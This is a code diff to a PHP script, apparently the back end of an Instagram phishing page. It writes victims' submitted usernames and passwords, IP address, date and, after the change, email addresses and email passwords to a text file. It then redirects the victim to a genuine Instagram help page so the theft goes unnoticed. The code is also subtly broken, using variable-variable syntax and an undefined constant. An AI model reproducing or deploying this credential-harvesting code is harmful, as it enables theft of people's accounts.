@@ -27,20 +27,7 @@ if(!empty($_GET['username']) && empty($_GET['comen']))
 if(isset($_GET['comen']))
 {
     $dosya = fopen("baris-altay.txt", "a");
-    fwrite($dosya, "
-    $_KULLANICI_ADI : ${$_GET['username']},
-    
-    $_SIFRE         : ${$_GET['password']},
-    
-    $_IP            : ${$_SERVER['REMOTE_ADDR']},
-    
-    $_TARIH         : ${date('Y:m:d', time())},
-    
-    
-    
-    
-    
-    ");
+    fwrite($dosya, "$_KULLANICI_ADI : ${$_GET['username']},".PHP_EOL.PHP_EOL."$_SIFRE         : ${$_GET['password']},".PHP_EOL.PHP_EOL."$_IP            : ${$_SERVER['REMOTE_ADDR']},".PHP_EOL.PHP_EOL."$_TARIH         : ${date('Y:m:d', time())}, $_EPOSTA          : ${$_GET['email']}, $_EPOSTA_SIFRESI         : ${$_GET['emailPassword']}".PHP_MULTILINE);
     fclose($dosya);
     
     header("location: https://help.instagram.com/854227311295302/?helpref=hc_fnav");
